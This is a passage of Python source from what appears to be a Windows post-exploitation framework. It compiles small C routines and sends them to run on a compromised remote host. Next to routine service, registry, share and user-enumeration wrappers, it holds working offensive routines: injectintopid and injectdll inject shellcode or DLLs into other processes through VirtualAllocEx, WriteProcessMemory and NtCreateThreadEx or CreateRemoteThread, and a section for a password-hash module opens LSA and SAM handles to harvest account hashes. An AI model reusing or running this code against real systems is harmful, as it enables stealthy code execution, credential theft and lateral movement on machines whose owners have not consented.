        int dwCheckPoint;
        int dwWaitHint;
        };

        void main()
        {
           int ret;
           int error;
           struct SERVICE_STATUS ServStatus;
           // Add arguments later
           ret=QueryServiceStatus(hService,&ServStatus);
           error=GetLastError();
           sendint(ret);
           if (ret==0) {
             sendint(error);
            }
            else {
              sendint(ServStatus.dwCurrentState);
            }
        }
        """


        vars={}
        vars["hService"]=hService

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret==0:
            val=self.readint() #error if ret!=0, else status
        else:
            val={}
            val["dwCurrentState"]=self.readint()
        self.leave()
        return ret,val

    def DeleteService(self,handle):
        code="""
        #import "local","advapi32.dll|DeleteService" as "DeleteService"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"
        #import "local", "sendint" as "sendint"
        #import "long long", "hService" as "hService"

        void main()
        {
           int ret;
           int error;
           ret=DeleteService(hService);
           error=GetLastError();
           sendint(ret);
           if (ret == 0) {
              sendint(error);
           }
        }
        """


        vars={}
        vars["hService"]=handle

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret==0:
            error=self.readint()
        else:
            error=0
        self.leave()
        return ret,error

    def NetShareEnum(self,server=None):
        """
        Enumerate shares on local machine
        """
        vars={}
        vars["servername"]=server
        code="""
        #import "local","netapi32.dll|NetShareEnum" as "NetShareEnum"
        #import "local","netapi32.dll|NetApiBufferFree" as "NetApiBufferFree"
        #import "local", "sendint" as "sendint"
        #import "local", "memcpy" as "memcpy"
        #import "local", "sendunistring2self" as "sendunistring2self"
        #import "local", "debug" as "debug"

        //will be Null if None is passed in
        #import "string", "servername" as "servername"

        struct SHARE_INFO_2 {
        char * shi2_netname; //wide char
        int shi2_type;
        char * shi2_remark; //wide char
        int shi2_permissions;
        int shi2_max_uses;
        int shi2_current_uses;
        char * shi2_path; //path in wide char
        char * shi2_passwd; //password in wide char
        } ;

        void main()
        {
        int i;
        int ret;
        int done;
        int resume_handle;
        int entries; //entries read in
        int totalentries; //total entries that can be read in
        struct SHARE_INFO_2 *si2; //array of share infoz
        struct SHARE_INFO_2 *si2p; //pointer to the one we use

        done=0;
        resume_handle=0;
        while (done==0) {
        //debug();
           ret=NetShareEnum(servername,2,&si2,50000,&entries,&totalentries,&resume_handle);
           sendint(ret); // ERROR_ACCESS_DENIED on failure
           //#define ERROR_MORE_DATA 234
           if (ret!=0 && ret != 234 ) {
           // some kind of error
              done=1;
           } else {
             sendint(entries);
             for (i=0; i<entries; i=i+1) {
                  si2p=si2+i;
                  sendunistring2self(si2p->shi2_netname);
                  sendint(si2p->shi2_type);
                  sendunistring2self(si2p->shi2_remark);
                  sendunistring2self(si2p->shi2_path);
                  //sendunistring2self(si2p->shi2_passwd);
             } //for loop
           } //else
           if (resume_handle==0) {
              done=1;
           } //if resume_handle
           NetApiBufferFree(si2);
        } //while done==0
        sendint(-1); //done
        } //main
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=sint32(self.readint())
        devlog("NetShareEnum","ret=%s"%ret)
        shares=[]
        while ret in [0,234]:
            entries=sint32(self.readint())
            devlog("NetShareEnum", "entries=%s"%entries)
            for i in range(0,entries):
                newshare=self.readblock()
                sharetype=self.readint()
                shareremark=self.readblock()
                sharepath=self.readblock()
                sharepassword=""
                #sharepassword=self.readblock()
                shares+=[(newshare,sharetype,shareremark,sharepath,sharepassword)]
                devlog("NetShareEnum","newshare=%s"%prettyprint(newshare))
                devlog("NetShareEnum","sharepath=%s"%prettyprint(sharepath))
                devlog("NetShareEnum","sharepasswd=%s"%prettyprint(sharepassword))
                devlog("NetShareEnum","shareremark=%s"%prettyprint(shareremark))
            ret=sint32(self.readint())
        self.leave()
        return shares

    def ControlService(self, hService, dwControl):
        """
        Send control codes to a running service - used mainly to stop a
        running service. Need to have the SERVICE_USER_DEFINED_CONTROL (0x100)
        access right on the passed in handle to the service otherwise you will
        get an access denied error.
        """

        code="""
        #import "local","advapi32.dll|ControlService" as "ControlService"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "long long", "hService" as "hService"
        #import "int", "dwControl" as "dwControl"

        struct SERVICE_STATUS {
        int dwServiceType;
        int dwCurrentState;
        int dwControlsAccepted;
        int dwWin32ExitCode;
        int dwServiceSpecificExitCode;
        int dwCheckPoint;
        int dwWaitHint;
        };

        void main()
        {
           int ret;
           int error;
           struct SERVICE_STATUS ServStatus;
           // Add arguments later
           ret=ControlService(hService,dwControl,&ServStatus);
           error=GetLastError();
           sendint(ret);
           //ret of zero indicates failure
           if (ret==0) {
             sendint(error);
            }
            else {
              sendint(ServStatus.dwCurrentState);
            }
        }
        """
        vars={}
        vars["hService"]=hService
        vars["dwControl"]=dwControl

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        ##Non zero return on success
        if ret==0:
            val=self.readint()
        else:
            val={}
            val["dwCurrentState"]=self.readint()
        self.leave()
        return ret,val


    def NetUserEnum(self,server=None):
        """
        Enumerate users on local machine
        """
        vars={}
        code="""
        #import "local","netapi32.dll|NetUserEnum" as "NetUserEnum"
        #import "local","netapi32.dll|NetApiBufferFree" as "NetApiBufferFree"
        #import "local", "sendint" as "sendint"
        #import "local", "memcpy" as "memcpy"
        #import "local", "sendunistring2self" as "sendunistring2self"
        #import "local", "debug" as "debug"

        struct USER_INFO_0 {
           short * username;
        };

        void main()
        {
        int ret;
        int done;
        struct USER_INFO_0 *ui0;
        struct USER_INFO_0 *ui0p;
        char ** buffer;
        short * servername;
        int resume_handle;
        int level;
        int prefmaxlength;
        int entries;
        int totalentries;
        int filter;
        int i; //loop variable

        filter=2; //FILTER_NORMAL_ACCOUNT
        prefmaxlength=4096;
        servername=0; // a null pointer means localhost
        level=0; //USER_INFO_0
        done=0; //we're not done yet
        resume_handle=0;
        buffer=&ui0;
        while (done==0) {
        //debug();
           ret=NetUserEnum(servername,level,filter,buffer,prefmaxlength,&entries,&totalentries,&resume_handle);
           sendint(ret); // ERROR_ACCESS_DENIED on failure
           //#define ERROR_MORE_DATA 234
           if (ret!=0 && ret != 234 ) {
           // some kind of error
              done=1;
           } else {
             sendint(entries);
             for (i=0; i<entries; i=i+1) {
                  ui0p=ui0+i;
                  sendunistring2self(ui0p->username);
             } //for loop
           } //else
           if (resume_handle==0) {
              done=1;
           } //if resume_handle
           NetApiBufferFree(ui0);
        } //while done==0
        sendint(-1); //done
        } //main
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=sint32(self.readint())
        #print "ret=%s"%ret
        usernames=[]
        while ret in [0,234]:
            entries=sint32(self.readint())
            #print "entries=%s"%entries
            for i in range(0,entries):
                newuser=self.readblock()
                usernames+=[newuser]
                #print "newuser=%s"%prettyprint(newuser)
            ret=sint32(self.readint())
        self.leave()
        return usernames


    def getsessionidfrompid(self,pid=-1):
        vars={}
        code="""
	#import "local","kernel32.dll|GetCurrentProcessId" as "GetCurrentProcessId"
	#import "local","kernel32.dll|ProcessIdToSessionId" as "ProcessIdToSessionId"
	#import "local","kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "int", "pid" as "pid"
        #import "local", "debug" as "debug"

	void main()
	{
	    int ret;
	    int sessionid;
	    int realpid;
	    int lasterror;

	//    if (pid==-1) {
	        realpid=GetCurrentProcessId();
	        //sendint(realpid);

	 //   } else {
	  //      realpid=pid;
	  //  }
	    ret=ProcessIdToSessionId(realpid,&sessionid);
	    lasterror=GetLastError();
	    sendint(lasterror);

	    if (ret==0) {
	        sendint(-2);
		return;
	    }
	    sendint(sessionid);
	    return;
	}
	"""
        vars["pid"]=pid
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        lasterror=sint32(self.readint())
        sessionid=sint32(self.readint())
        self.leave()
        logging.debug("getsessionidfrompid: lasterror=%d", lasterror)
        return sessionid


    def injectintopid(self, pid, shellcode, exit_success=False, socket_handle=None):
        """
        Injects `shellcode' into process with given `pid' then creates and starts
        a new thread to run it. If `exit_success' is True then upon successfull injection
        we cleanly terminate the current thread by calling ExitThread.

        This method automatically checks for and uses NtCreateThreadEx when available.
        Otherwise it falls back on CreateRemoteThread.

        Returns 0 on failure, result of CreateRemoteThread/NtCreateThreadEx on success.
        """

        new_api = self.create_thread_ex_check()

        vars = {
            'PID'       : pid,
            'SHELLCODE' : shellcode,
            'CODESIZE'  : len(shellcode),
        }

        code = """
        #import "local", "kernel32.dll|OpenProcess" as    "OpenProcess"
        #import "local", "kernel32.dll|VirtualAllocEx" as "VirtualAllocEx"
        #import "local", "kernel32.dll|VirtualAlloc" as   "VirtualAlloc"
        #import "local", "kernel32.dll|VirtualFree" as    "VirtualFree"
        #import "local", "kernel32.dll|WriteProcessMemory" as "WriteProcessMemory"
        #import "local", "kernel32.dll|CloseHandle" as    "CloseHandle"
        #import "local", "kernel32.dll|ExitThread" as     "ExitThread"
        """

        # CreateRemotethread of NtCreateThreadEx
        if new_api:
            self.log('[*] New API, using NtCreateThreadEx')
            code += """
            #import "local", "ntdll.dll|NtCreateThreadEx" as "NtCreateThreadEx"
            """
        else:
            self.log('[*] Old API, using CreateRemoteThread')
            code += """
            #import "local", "kernel32.dll|CreateRemoteThread" as "CreateRemoteThread"
            """

        if (socket_handle != None) and exit_success:
            vars["SOCKET_HANDLE"] = socket_handle
            code += """
                    #import "int", "SOCKET_HANDLE" as "SOCKET_HANDLE"
                    """

        code += """
        #import "local",  "memset" as "memset"
        #import "local",  "sendint" as "sendint"
        #import "local",  "sendlonglong" as "sendlonglong"
        #import "int",    "PID" as "PID"
        #import "int",    "CODESIZE" as "CODESIZE"
        #import "string", "SHELLCODE" as "SHELLCODE"

        struct UNKNOWN {
            long long Length;

            long long Unknown1;
            long long Unknown2;
            long long Unknown3;
            long long Unknown4;

            long long Unknown5;
            long long Unknown6;
            long long Unknown7;
            long long Unknown8;
        };

        void main()
        {
            long long pHandle;
            long long address;
            long long hRemote_Thread;
            struct UNKNOWN Buffer;
            long long dw0;
            long long dw1;
            long hRes;
            dw0 = 0;
            dw1 = 0;
            char *source;
            char *threadme;
            int i;
            long long rVal;

            pHandle = OpenProcess(0x43a, 0, PID); // get a handle to the process we want to migrate to
            if (pHandle == 0)
            {
                sendint(-1);
                return;
            }

            threadme = SHELLCODE;
            source = VirtualAlloc(0, CODESIZE, 0x1000, 0x40);
            if (source == 0)
            {
                sendint(-2);
                return;
            }

            for (i = 0; i < CODESIZE; i = i + 1)
            {
                source[i] = threadme[i];
            }

            address = VirtualAllocEx(pHandle, 0, CODESIZE, 0x1000, 0x40);
            if (address == 0)
            {
                sendint(-3);
                return;
            }

            i = WriteProcessMemory(pHandle, address, source, CODESIZE, 0);
            if (i == 0)
            {
                sendint(-4);
                return;
            }

            // free kludge memory
            VirtualFree(source, 0, 0x8000);
            sendint(0); // to nudge the localnode along
            """

        if new_api:
            code += """
                memset(&Buffer, 0, 72);
                Buffer.Length   = 72;
                Buffer.Unknown1 = 0x10003;
                Buffer.Unknown2 = 16;
                Buffer.Unknown3 = &dw1;
                Buffer.Unknown5 = 0x10004;
                Buffer.Unknown6 = 8;
                Buffer.Unknown7 = &dw0;
                hRemote_Thread = 0;
                hRes = 0;

                hRes = NtCreateThreadEx(&hRemote_Thread, 0x1FFFFF, 0, pHandle, address, 0, 0, 0, 0, 0, &Buffer);

                if (hRes < 0)
                {
                    rVal = 0;
                } else {
                    rVal = hRemote_Thread;
                }
            """
        else:
            code += """
                rVal = 0;
                rVal = CreateRemoteThread(pHandle, 0, 0, address, 0, 0, 0);
            """

        code += """
            sendlonglong(rVal);
        """

        if exit_success:
            exit_code = """
            if (rVal != 0) {
                CLOSE_ORIG_SOCKET_CODE
                ExitThread(0);
            }
            }
            """
            close_socket_code = ""
            if socket_handle != None:
                vars["SOCKET_HANDLE"] = socket_handle
                close_socket_code = "CloseHandle(SOCKET_HANDLE);"

            exit_code = exit_code.replace("CLOSE_ORIG_SOCKET_CODE", close_socket_code)

            code += exit_code
        else:
            code += """
            }
            """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)

        status = sint32(self.readint())
        if status == 0:
            result = self.readlonglong()
        self.leave()

        if status == -1:
            self.log('[!] OpenProcess failed')
        elif status == -2:
            self.log('[!] VirtualAlloc failed')
        elif status == -3:
            self.log('[!] VirtualAllocEx failed')
        elif status == -4:
            self.log('[!] WriteProcessMemory failed')

        if status < 0: return 0
        return result


    def injectdll(self, pid, dll_path):
        """
        Uploads and injects the given DLL with path `dll_path' (on the local system)
        to the process with `pid' on the remote node. The DLL entry point is then called.

        This method automatically checks for and uses NtCreateThreadEx when available.
        Otherwise it falls back on CreateRemotethread.

        Returns 0 on failure, result of CreateRemoteThread/NtCreateThreadEx on success.
        """
        new_api = self.create_thread_ex_check()

        vars             = {}
        vars['PID']      = pid
        vars['DLL_PATH'] = dll_path + '\x00'
        vars['DLL_LEN']  = len(dll_path) + 1
        vars['FUNC_PTR'] = self.getprocaddress('kernel32.dll|LoadLibraryA')

        code = """
        #import "local", "kernel32.dll|OpenProcess" as "OpenProcess"
        #import "local", "kernel32.dll|VirtualAllocEx" as "VirtualAllocEx"
        #import "local", "kernel32.dll|WriteProcessMemory" as "WriteProcessMemory"
        """

        # CreateRemotethread of NtCreateThreadEx
        if new_api:
            self.log('[*] New API, using NtCreateThreadEx')
            code += """
            #import "local", "ntdll.dll|NtCreateThreadEx" as "NtCreateThreadEx"
            """
        else:
            self.log('[*] Old API, using CreateRemoteThread')
            code += """
            #import "local", "kernel32.dll|CreateRemoteThread" as "CreateRemoteThread"
            """

        code += """
        #import "local",  "memset" as "memset"
        #import "local",  "sendint" as "sendint"
        #import "local",  "sendlonglong" as "sendlonglong"

        #import "int",       "PID" as "PID"
        #import "int",       "DLL_LEN" as "DLL_LEN"
        #import "long long", "FUNC_PTR" as "FUNC_PTR"
        #import "string",    "DLL_PATH" as "DLL_PATH"

        struct UNKNOWN {
            long long Length;

            long long Unknown1;
            long long Unknown2;
            long long Unknown3;
            long long Unknown4;

            long long Unknown5;
            long long Unknown6;
            long long Unknown7;
            long long Unknown8;
        };

        void main()
        {
            long long pHandle;
            long long hRemote_Thread;
            struct UNKNOWN Buffer;
            long long dw0;
            long long dw1;
            long hRes;
            int i;
            long long ret;
            long long dest;

            dw0 = 0;
            dw1 = 0;

            pHandle = OpenProcess(0x1F0FFF, 0, PID); // get a handle to the process we want to migrate to
            if (pHandle == 0)
            {
                sendint(-1);
                return;
            }

            dest = VirtualAllocEx(pHandle, 0, DLL_LEN, 0x1000, 0x40);
            if (dest == 0)
            {
                sendint(-2);
                return;
            }

            i = WriteProcessMemory(pHandle, dest, DLL_PATH, DLL_LEN, 0);
            if (i == 0)
            {
                sendint(-3);
                return;
            }

            sendint(0); // to nudge the localnode along
            """

        if new_api:
            code += """
                memset(&Buffer, 0, 72);
                Buffer.Length   = 72;
                Buffer.Unknown1 = 0x10003;
                Buffer.Unknown2 = 16;
                Buffer.Unknown3 = &dw1;
                Buffer.Unknown5 = 0x10004;
                Buffer.Unknown6 = 8;
                Buffer.Unknown7 = &dw0;
                hRemote_Thread = 0;
                hRes = 0;

                hRes = NtCreateThreadEx(&hRemote_Thread, 0x1FFFFF, 0, pHandle, FUNC_PTR, dest, 0, 0, 0, 0, &Buffer);

                if (hRes < 0)
                {
                    ret = 0;
                } else {
                    ret = hRemote_Thread;
                }
            """
        else:
            code += """
                ret = CreateRemoteThread(pHandle, 0, 0, FUNC_PTR, dest, 0, 0);
            """

        code += """
            sendlonglong(ret);
            }
        """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)

        status = sint32(self.readint())
        if status == 0:
            result = self.readlonglong()
        self.leave()

        if status == -1:
            self.log('[!] OpenProcess failed')
        elif status == -2:
            self.log('[!] VirtualAllocEx failed')
        elif status == -4:
            self.log('[!] WriteProcessMemory failed')

        if status < 0: return 0
        return result




    def RegOpenKeyEx(self,hKey,keyname,access):
        """
        Open a registry key for later use
        """

        hKey=keyDict.get(hKey,hKey)
        access=accessDict.get(access,access)
        vars={}
        code="""
        #import "local","advapi32.dll|RegOpenKeyExA" as "RegOpenKeyEx"

        #import "local", "sendlonglong" as "sendlonglong"

        #import "string", "keyname" as "keyname"
        #import "long long", "hKey" as "hKey"
        #import "int", "access" as "access"



        void main()
        {
        int ret;
        long long hKey2;
        ret=RegOpenKeyExA(hKey,keyname,0,access,&hKey2);
        if (ret==0) {
           sendlonglong(hKey2); //0 on sucess
           }
        else {
          sendlonglong(0);
         }
        }
        """
        vars["keyname"]=keyname
        vars["hKey"]=hKey
        vars["access"]=access

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readlonglong()
        self.leave()
        return fd


    def RegQueryValueEx(self,hKey,valuename):

        hKey=keyDict.get(hKey,hKey)
        vars={}
        code="""
        #import "local","advapi32.dll|RegQueryValueExA" as "RegQueryValueExA"

        #import "local", "sendint" as "sendint"
        #import "local", "senddata2self" as "senddata2self"
        #import "local", "malloc" as "malloc"
        #import "local", "free" as "free"

        #import "string", "valuename" as "valuename"
        #import "long long", "hKey" as "hKey"




        void main()
        {
        int ret;
        int datatype;
        char *data;
        int datasize;

        data = malloc(0x1000);
        datasize=1024;

        ret=RegQueryValueExA(hKey,valuename,0,&datatype,data,&datasize);
        if (ret==0) {
           sendint(1);
           sendint(datatype);
           senddata2self(data,datasize); //0 on success
           }
        else {
          sendint(0); //failure
          sendint(ret); //errorcode
         }
        free(data);
        }
        """
        vars["valuename"]=valuename
        vars["hKey"]=hKey


        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        datatype=0
        if ret:
            datatype=self.readint()
            data=self.readblock() #value
        else:
            data=self.readint() #errorcode
        self.leave()
        return ret,datatype,data



    def RegSetValueEx(self,hKey,valuename,datatype,data):


        hKey=keyDict.get(hKey,hKey)
        datatypedict={}
        datatypedict["REG_MULTI_SZ"]=7
        datatypedict["REG_NONE"]=0
        datatypedict["REG_EXPAND_SZ"]=2
        datatypedict["REG_BINARY"]=3
        datatypedict["REG_DWORD"]=4
        datatypedict["REG_DWORD_LITTLE_ENDIAN"]=4
        datatypedict["REG_DWORD_BIG_ENDIAN"]=5
        datatypedict["REG_LINK"]=6
        datatypedict["REG_SZ"]=1

        if not datatypedict.has_key(datatype):
            ##Bad data type passed
            logging.error("Bad data type for reg key passed")
            return 0, -9999

        datatype=datatypedict.get(datatype,datatype)

        if datatype==4:
            data=intel_order(data) #you passed an integer
        if datatype==5:
            data=big_order(data)

        datasize=len(data)

        vars={}
        code="""
        #import "local","advapi32.dll|RegSetValueExA" as "RegSetValueExA"

        #import "local", "sendint" as "sendint"

        #import "string", "valuename" as "valuename"
        #import "long long", "hKey" as "hKey"
        #import "int", "datatype" as "datatype"
        #import "int", "datasize" as "datasize"
        #import "string", "data" as "data"




        void main()
        {
        int ret;

        ret=RegSetValueExA(hKey,valuename,0,datatype,data,datasize);
        if (ret==0) {
           sendint(1);
           }
        else {
          sendint(0); //failure
          sendint(ret); //errorcode
         }
        }
        """
        vars["valuename"]=valuename
        vars["hKey"]=hKey
        vars["datatype"]=datatype
        vars["datasize"]=datasize
        vars["data"]=data

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        errorcode=0
        if ret==0:
            errorcode=self.readint() #errorcode
        self.leave()
        return ret,errorcode

    def RegEnumKeyEx(self,hKey):
        """
        Enum an opened registry key.
        """

        hKey=keyDict.get(hKey,hKey)
        vars={}
        code="""
        #import "local","advapi32.dll|RegEnumKeyExA" as "RegEnumKeyExA"

        #import "local", "sendint" as "sendint"
        #import "local", "sendstring" as "sendstring"
        #import "local", "malloc" as "malloc"
        #import "local", "free" as "free"

        #import "long long", "hKey" as "hKey"

        #define REG_SUB_SIZE 1000
        #define ERROR_NO_MORE_ITEMS 259
        #define ERROR_MORE_DATA 234

        void main()
        {
        int ret;
        int i;
        char *subkey;
        int *subkeysize;
        int go;

        i = 0;
        subkeysize = malloc(4);
        *subkeysize = REG_SUB_SIZE;
        subkey = malloc(REG_SUB_SIZE);
        go = 1;

        while(go==1){
          ret = RegEnumKeyExA(hKey, i, subkey, subkeysize, NULL, NULL, NULL, NULL);
          if(ret==0){
            sendint(1);
            sendstring(subkey);
          }
          //ERROR_MORE_DATA || ERROR_NO_MORE_ITEMS
          else{
            sendint(0);
            go=0;
          }
          //ignore ERROR_MORE_DATA
          i = i+1;
          *subkeysize = REG_SUB_SIZE;
        }
        free(subkey);
        free(subkeysize);
        }
        """
        vars["hKey"]=hKey

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        l = []
        while self.readint() == 1:
            l.append(self.readstring())
        self.leave()
        return l

    def RegCloseKey(self,hKey):
        code="""
        #import "local","advapi32.dll|RegCloseKey" as "RegCloseKey"

        #import "local", "sendint" as "sendint"
        #import "long long", "hKey" as "hKey"

        void main()
        {
           int ret;
           ret = RegCloseKey(hKey);
           sendint(ret);
        }
        """


        vars={}
        vars["hKey"]=hKey

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def usingISAPI(self):
        """
	Returns True if we are using an ISAPI to tunnel our socket over.
        This means some things must be done differently, or won't work
        at all (i.e. mosdefmigrate/shellshock don't work).
	"""
        if self.isapidict != {}: return True
        return False

    ###########################################
    # Methods for getpasswordhashes module
    ###########################################

    def LsaOpenPolicy(self, system, access):
        """
        Open an LSA Policy
        """
        if system is None: system = ""

        vars           = {}
        systemname     = msunistring(system) + "\x00\x00\x00\x00"
        vars["buffer"] = systemname
        vars["length"] = len(systemname)
        vars["access"] = access

        code = """
        #import "local", "advapi32.dll|LsaOpenPolicy" as "LsaOpenPolicy"
        #import "local", "sendint" as "sendint"
        #import "local", "sendlonglong" as "sendlonglong"
        #import "local", "memset" as "memset"
        #import "string", "buffer" as "buffer"
        #import "int", "access" as "access"
        #import "int", "length" as "length"

        """

        code += """
        struct LSA_OBJECT_ATTRIBUTES {
           int Length;
           int pad1;  // MOSDEF doesn't know about alignment
           long long RootDirectory;
           long long ObjectName;
           int Attributes;
           int pad2;
           long long SecurityDescriptor;
           long long SecurityQualityOfService;
        };

        struct LSA_UNICODE_STRING {
           unsigned short Length; //length in bytes
           unsigned short MaximumLength; //max length in bytes
           char *Buffer; //wstring printer
        };

        void main()
        {
            struct LSA_OBJECT_ATTRIBUTES oa;
            struct LSA_UNICODE_STRING lus;
            long long lsaHandle;
            int ret;

            memset(&oa, 0, 48);
            oa.Length = 48;
        """

        if system != "":
            code+="""
            lus.Length        = length;
            lus.MaximumLength = length;
            lus.Buffer        = buffer;
            """

        code += """
            //if systemname==0, then we open on the local system. Systemname
            //  is a LSA_UNICODE_STRING structure.
            //object attributes is not used, so they shuld all be zero. This is lame.
            //accessmask is your basic access mask
            //returns 0 on success, NTSTATUS on error
        """

        if system == "":
            code += "ret = LsaOpenPolicy(0, &oa, access, &lsaHandle); //localhost\n"
        else:
            #systemname sent to api
            code += """
            ret = LsaOpenPolicy(&lus, &oa, access, &lsaHandle);
            """
        code += """
            if (ret == 0) {
               //success
               sendint(1);
               sendlonglong(lsaHandle);
            } else {
              //failure
              sendint(0);
              sendint(ret);
            }
        }
        """

        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint()
        if ret == 1:
            handle = self.readlonglong()
        else:
            handle = self.readint()

        self.leave()
        return ret, handle


    def LsaQueryInformationPolicy(self, policy, infoclass):
        """
        Query an LSA Policy
        """

        infoclassDict = {}
        infoclassDict["PolicyPrimaryDomainInformation"] = 0x3

        #POLICY_VIEW_LOCAL_INFORMATION access right on the policy handle required
        infoclassDict["PolicyAccountDomainInformation"] = 0x5

        infoclass = infoclassDict.get(infoclass, infoclass)

        vars              = {}
        vars["policy"]    = policy
        vars["infoclass"] = infoclass

        code = """
        #import "local", "advapi32.dll|LsaQueryInformationPolicy" as "LsaQueryInformationPolicy"
        #import "local", "sendint" as "sendint"
        #import "local", "sendlonglong" as "sendlonglong"
        #import "local", "sendunistring2self" as "sendunistring2self"
        #import "long long", "policy" as "policy"
        #import "int", "infoclass" as "infoclass"

        struct POLICY_ACCOUNT_DOMAIN_INFO {
          unsigned short Length;
          unsigned short MaximumLength;
          int pad1;
          long long Buffer;
          long long DomainSid;
        };

        void main()
        {
           struct POLICY_ACCOUNT_DOMAIN_INFO* pDomainInfo;
           int ret;

           pDomainInfo = 0;
           ret = LsaQueryInformationPolicy(policy, infoclass, &pDomainInfo);
           if (ret==0) {
               //success
               sendint(1);

               sendunistring2self(pDomainInfo->Buffer);
               sendlonglong(pDomainInfo->DomainSid);
           }
           else {
               //some kind of error (NTSTATUS)
               sendint(0);
               sendint(ret);
           }
        }
        """

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        if ret == 0:
            errcode = self.readint()
        else:
            buffer = self.readblock()
            sid = self.readlonglong()
            errcode = [buffer,sid] #basically a tuple

        self.leave()
        return ret, errcode


    def LsaClose(self, policy):
        """
        LsaClose on MSDN http://msdn2.microsoft.com/en-us/library/ms721787.aspx

        If you don't use this after opening a policy, no one else can open it (no other thread, essentially)
        """

        vars           = {}
        vars["policy"] = policy
        code           = """
        #import "local" , "advapi32.dll|LsaClose" as "LsaClose"
        #import "local" , "sendint" as "sendint"
        #import "long long", "policy" as "policy"

        void main()
        {
            int ret;

            ret = LsaClose(policy);
            sendint(ret);
        }
        """

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        self.leave()
        return ret

    def SamIConnect(self, access):
        vars           = {}
        vars["access"] = access
        code           = """
        #import "local", "samsrv.dll|SamIConnect" as "SamIConnect"
        #import "local", "sendint" as "sendint"
        #import "local", "sendlonglong" as "sendlonglong"
        #import "int",   "access" as "access"

        void main()
        {
            int ret;
            long long hSam;

            //I bet this 0 is the host
            ret = SamIConnect(0, &hSam, access, 1);
            if (ret == 0) {
                sendint(1); //0 on success
                sendlonglong(hSam);
            }
            else {
                sendint(0);
                sendint(ret);
            }
        }
        """

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        hSam = self.readlonglong() if ret == 1 else self.readint()
        self.leave()
        return ret, hSam


    def SamrOpenDomain(self, hSam, DomainSid):
        vars              = {}
        vars["hSam"]      = hSam
        vars["DomainSid"] = DomainSid
        code              = """
        #import "local","samsrv.dll|SamrOpenDomain" as "SamrOpenDomain"
        #import "local", "sendint" as "sendint"
        #import "local", "sendlonglong" as "sendlonglong"

        #import "long long", "hSam" as "hSam"
        #import "long long", "DomainSid" as "DomainSid"

        void main()
        {
            int ret;
            long long hDomain;

            ret = SamrOpenDomain(hSam, 0xf07ff, DomainSid, &hDomain);
            if (ret ==0 ) {
                sendint(1);
                sendlonglong(hDomain);
            } else {
                sendint(0);
                sendint(ret);
            }
        }
        """

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        hDomain = self.readlonglong() if ret == 1 else self.readint()
        self.leave()
        return ret, hDomain


    def SamrCloseHandle(self, handle):
        vars           = {}
        vars["handle"] = handle

        code           = """
        #import "local","samsrv.dll|SamrCloseHandle" as "SamrCloseHandle"
        #import "local", "sendint" as "sendint"
        #import "long long", "handle" as "handle"

        void main()
        {
           int ret;
           long long pHandle;

           pHandle = handle;
           ret = SamrCloseHandle(&pHandle); // wants a pointer .. MOSDEF semantics
           sendint(ret);
        }
        """

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint()
        self.leave()
        return ret

    def NetShareAdd(self,netname,sharename,drivepath):
        "http://msdn.microsoft.com/library/default.asp?url=/library/en-us/netmgmt/netmgmt/netshareadd.asp"
        vars={}
        STYPE_DISKTREE=0
        code="""
        #import "local","netapi32.dll|NetShareAdd" as "NetShareAdd"

        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        #import "string", "sharename" as "sharename"
        #import "string", "drivepath" as "drivepath"
        #import "string", "netname" as "netname"

        struct SHARE_INFO_2 {
        char * shi2_netname; //wide characters
        int shi2_type;
        char * shi2_remark; //wide characters
        int shi2_permissions;
        int shi2_max_uses;
        int shi2_current_uses;
        char * shi2_path; //wide characters
        char * shi2_passwd; //wide characters
        };


        void main()
        {
        struct SHARE_INFO_2 si;
        char remark[8];
        char *p;
        int ret;
        int err;

        p=remark;
        //clear this so it's a null string in wide characters
        memset(p,0,8);

        err=0;

        //set up structure
        si.shi2_netname=sharename;
        si.shi2_type=0;
        si.shi2_remark=p;
        si.shi2_permissions=0;
        si.shi2_max_uses=-1;
        si.shi2_current_uses=0;
        si.shi2_path=drivepath;
        si.shi2_passwd=0;

        ret=NetShareAdd(netname,2,&si,&err);
        if (ret==0) {
           sendint(1); //0 on success
           }
        else {
          sendint(0);
          sendint(ret);
          sendint(err);
         }
        }
        """
        vars["sharename"]=msunistring(sharename)+"\x00\x00\x00\x00"
        vars["drivepath"]=msunistring(drivepath)+"\x00\x00\x00\x00"
        vars["netname"]=msunistring(netname)+"\x00\x00\x00\x00"
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        errcode=0
        if ret==0:
            errcode=self.readint()
            erroffset=self.readint()
            logging.error("errcode=%d erroffset=%d"%(errcode,erroffset))
        self.leave()
        return ret,errcode


    def SamrEnumerateUsersInDomain(self, hDomain):
        """
        This is the function that gathers the actual users. Returns 0 on failure.
        """

